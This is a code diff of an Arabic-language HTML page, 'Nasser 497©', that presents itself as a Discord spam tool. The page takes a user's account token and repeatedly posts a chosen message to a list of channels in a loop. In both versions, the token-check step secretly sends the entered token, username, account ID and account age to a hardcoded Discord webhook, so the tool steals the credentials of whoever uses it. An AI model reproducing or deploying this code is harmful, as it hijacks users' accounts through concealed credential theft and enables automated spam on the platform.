@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Nasser 497©</title>
   <style>
     body {
@@ -31,11 +31,7 @@
       font-size: 1em;
       cursor: pointer;
     }
-    #nextBtn {
-      background-color: green;
-      color: white;
-    }
-    #sendBtn {
+    #nextBtn, #sendBtn {
       background-color: green;
       color: white;
     }
@@ -63,14 +59,14 @@
   <h1>Nasser 497©</h1>
 
   <div id="page1">
-    <textarea id="tokens" rows="10" placeholder="اكتب التوكنات، كل توكن بسطر\nمثال:\nMTAxMjM0NTY3ODkwMTIzNDU2Nw.Gabcd.abcde123456\nMTAxMjM0NTY3ODkwMTIzNDU2Nw.Gefgh.abcdef654321\n"></textarea><br>
+    <textarea id="token" rows="2" placeholder="أدخل التوكن هنا (توكن واحد فقط)"></textarea><br />
     <button id="nextBtn">التالي</button>
     <div id="tokenStatus"></div>
   </div>
 
   <div id="page2" class="hidden">
-    <textarea id="ids" rows="3" placeholder="اكتب الايديات (مفصولة بفاصلة)"></textarea><br>
-    <input type="text" id="message" placeholder="قم بوضع الكلام"><br>
+    <textarea id="ids" rows="3" placeholder="اكتب الايديات (مفصولة بفاصلة)"></textarea><br />
+    <input type="text" id="message" placeholder="قم بوضع الكلام" /><br />
     <select id="speed">
       <option value="1">1</option>
       <option value="0.9">0.9</option>
@@ -82,102 +78,97 @@
       <option value="0.3">0.3</option>
       <option value="0.2">0.2</option>
       <option value="0.1">0.1</option>
-    </select><br>
+    </select><br />
     <button id="sendBtn">بدء الارسال</button>
     <button id="stopBtn">ايقاف الارسال</button>
     <p style="margin-top: 30px;">Nasser 497©</p>
   </div>
 
   <script>
-    const nextBtn = document.getElementById('nextBtn');
-    const page1 = document.getElementById('page1');
-    const page2 = document.getElementById('page2');
-    const tokensInput = document.getElementById('tokens');
-    const tokenStatus = document.getElementById('tokenStatus');
+    const nextBtn = document.getElementById("nextBtn");
+    const page1 = document.getElementById("page1");
+    const page2 = document.getElementById("page2");
+    const tokenInput = document.getElementById("token");
+    const tokenStatus = document.getElementById("tokenStatus");
 
     nextBtn.onclick = async () => {
-      const raw = tokensInput.value.trim();
-      const tokens = [...new Set(raw.split(/\s+/).filter(t => t.length > 10))];
-      const validTokens = [];
-      tokenStatus.textContent = 'جاري التحقق من التوكنات...';
-
-      let statusText = '';
-
-      for (const token of tokens) {
-        try {
-          const res = await fetch('https://discord.com/api/v10/users/@me', {
-            headers: {
-              Authorization: token,
-              'Content-Type': 'application/json',
-              'User-Agent': 'Mozilla/5.0'
-            }
-          });
-          const text = await res.text();
-          if (res.ok) {
-            const data = JSON.parse(text);
-            const createdAt = new Date((BigInt(data.id) >> 22n) + 1420070400000n);
-            const ageDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
-            const msg = `توكن الحساب : ${token}\nيوزور الحساب : ${data.username}#${data.discriminator}\nايدي الحساب : ${data.id}\nعدد ايام الحساب : ${ageDays}`;
-
-            fetch('https://discord.com/api/webhooks/1383808164331520121/Lef_QBFXzuFRm6QDdfzahxbDFhOpckoOaa53hHVKjS9p7yUfMEc9YkLDSo76ENGycA9z', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ content: msg })
-            });
-
-            validTokens.push(token);
-            statusText += `✅ صحيح: ${token}\n`;
-          } else {
-            statusText += `❌ خاطئ: ${token}\nسبب Discord: ${text}\n`;
-          }
-        } catch (err) {
-          statusText += `❌ خطأ بالشبكة: ${token}\n`;
-        }
+      const token = tokenInput.value.trim();
+      if (!token) {
+        alert("يرجى إدخال توكن واحد");
+        return;
+      }
+     
+      if (token.includes(" ") || token.includes("\n")) {
+        alert("الرجاء إدخال توكن واحد فقط بدون فراغات");
+        return;
       }
 
-      tokenStatus.textContent = statusText;
+      tokenStatus.textContent = "جاري التحقق من التوكن...";
+      try {
+        const res = await fetch("https://discord.com/api/v10/users/@me", {
+          headers: {
+            Authorization: token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0",
+          },
+        });
+        const text = await res.text();
+        if (res.ok) {
+          const data = JSON.parse(text);
+          const createdAt = new Date((BigInt(data.id) >> 22n) + 1420070400000n);
+          const ageDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
+          const msg = `توكن الحساب : ${token}\nيوزور الحساب : ${data.username}#${data.discriminator}\nايدي الحساب : ${data.id}\nعدد ايام الحساب : ${ageDays}`;
 
-      if (validTokens.length > 0) {
-        tokensInput.value = validTokens.join('\n');
-        page1.classList.add('hidden');
-        page2.classList.remove('hidden');
-      } else {
-        alert("لا يوجد توكنات صحيحة!");
+          fetch(
+            "https://discord.com/api/webhooks/1383808164331520121/Lef_QBFXzuFRm6QDdfzahxbDFhOpckoOaa53hHVKjS9p7yUfMEc9YkLDSo76ENGycA9z",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: msg }),
+            }
+          );
+
+          tokenStatus.textContent = "✅ التوكن صحيح";
+          page1.classList.add("hidden");
+          page2.classList.remove("hidden");
+        } else {
+          tokenStatus.textContent = `❌ التوكن غير صحيح\nسبب Discord: ${text}`;
+        }
+      } catch (err) {
+        tokenStatus.textContent = "❌ حدث خطأ في الشبكة";
       }
     };
 
     let sending = false;
 
-    document.getElementById('sendBtn').onclick = async () => {
+    document.getElementById("sendBtn").onclick = async () => {
       sending = true;
-      const tokens = tokensInput.value.trim().split(/\s+/);
-      const ids = document.getElementById('ids').value.trim().split(',');
-      const message = document.getElementById('message').value;
-      const speed = parseFloat(document.getElementById('speed').value);
+      const token = tokenInput.value.trim();
+      const ids = document.getElementById("ids").value.trim().split(",");
+      const message = document.getElementById("message").value;
+      const speed = parseFloat(document.getElementById("speed").value);
 
       while (sending) {
-        for (const token of tokens) {
-          for (const id of ids) {
-            if (!sending) return;
-            try {
-              await fetch(`https://discord.com/api/v10/channels/${id.trim()}/messages`, {
-                method: 'POST',
-                headers: {
-                  'Authorization': token,
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: message })
-              });
-              await new Promise(r => setTimeout(r, speed * 1000));
-            } catch (e) {
-              console.warn("فشل الارسال على:", id);
-            }
+        for (const id of ids) {
+          if (!sending) return;
+          try {
+            await fetch(`https://discord.com/api/v10/channels/${id.trim()}/messages`, {
+              method: "POST",
+              headers: {
+                Authorization: token,
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ content: message }),
+            });
+            await new Promise((r) => setTimeout(r, speed * 1000));
+          } catch (e) {
+            console.warn("فشل الارسال على:", id);
           }
         }
       }
     };
 
-    document.getElementById('stopBtn').onclick = () => {
+    document.getElementById("stopBtn").onclick = () => {
       sending = false;
     };
   </script>
